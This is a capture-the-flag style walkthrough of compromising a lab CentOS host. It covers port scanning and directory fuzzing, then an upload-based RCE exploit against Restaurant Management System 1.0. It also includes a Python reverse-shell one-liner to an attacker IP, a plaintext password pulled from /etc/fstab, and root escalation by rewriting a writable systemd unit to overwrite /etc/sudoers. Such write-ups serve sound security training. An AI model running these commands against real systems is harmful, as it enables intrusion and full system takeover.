## MACHINE IP
```bash
10.201.126.112
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Sat Oct  4 15:38:55 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.126.112
Nmap scan report for 10.201.126.112
Host is up (0.29s latency).
Not shown: 65440 filtered tcp ports (no-response), 93 filtered tcp ports (host-prohibited)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: We&#39;ve got some trouble | 404 - Resource not found

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  4 15:40:46 2025 -- 1 IP address (1 host up) scanned in 111.41 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```
## RECON
```bash
# Operating System
cat /etc/*-release
CentOS Linux release 7.9.2009 (Core)
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
```
## ENUMERATION
```bash
- Fuzzing port 12340
sudo ffuf -r -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404 -u $url:12340/FUZZ/ | tee fuzz/ffuf-raft-large-directories
icons                   [Status: 200, Size: 74409, Words: 7427, Lines: 1007, Duration: 285ms]
rms                     [Status: 200, Size: 5982, Words: 1573, Lines: 119, Duration: 284ms]

- Register new user 
- Looks like some hotel managemnet login
- Google Fu found - https://www.exploit-db.com/exploits/47520
  
searchsploit -m 47520  
- For some reason the script was not working created some errors  
  
- Fixed the script and added to repo
https://github.com/binaryxploit/Restaurant-Management-System-1.0-RCE

git clone https://github.com/binaryxploit/Restaurant-Management-System-1.0-RCE.git
cd Restaurant-Management-System-1.0-RCE
chmod +x rms-rce.py
python3 rms-rce.py http://10.201.126.112:12340/rms/

[+] Restaurant Management System Exploit, Uploading Shell
[+] Sending exploit to: http://10.201.126.112:12340/rms/admin/foods-exec.php
[+] Shell Uploaded. Please check the URL: http://10.201.126.112:12340/rms/images/reverse-shell.php
[+] Example: http://10.201.126.112:12340/rms/images/reverse-shell.php?cmd=whoami

http://10.201.126.112:12340/rms/images/reverse-shell.php?cmd=whoami
```
## INITIAL SHELL
```bash
- Start listener
sudo nc -nvlp 80

- Access the url to trigger shell
http://10.201.126.112:12340/rms/images/reverse-shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.80.25",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
## PRIVILEGE ESCALATION
```bash
- Run linpeas.sh
You have write privileges over /etc/systemd/system/zeno-monitoring.service
etc/fstab:#//10.10.10.10/secret-share        /mnt/secret-share       cifs    _netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domai
n=localdomain,soft      0 0

- Found creds password=FrobjoodAdkoonceanJa
- Try using the creds for user edward !!! Worked

[edward@zeno ~]$ sudo -l                                                                      
Matching Defaults entries for edward on zeno:
!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
User edward may run the following commands on zeno:
(ALL) NOPASSWD: /usr/sbin/reboot              
 
cat /etc/systemd/system/zeno-monitoring.service
[Unit]                                                                                        
Description=Zeno monitoring
[Service]
Type=simple
User=root
ExecStart=/tmp/zeno-monitoring.py
[Install]
WantedBy=multi-user.target   

- Edit the ExecStart to add the user to sudoers
ExecStart=/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

- It was annoying to edit on vim and nano was not available also 
- created a file zeno-monitoring.service with edited contents transfered from kali and copied to the path /etc/systemd/system/zeno-monitoring.service
 
- Reboot 
/usr/sbin/reboot  
```
## ROOT | ADMINISTRATOR - PWNED
```bash
# Login as user edward
[edward@zeno ~]$ sudo su
[root@zeno edward]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
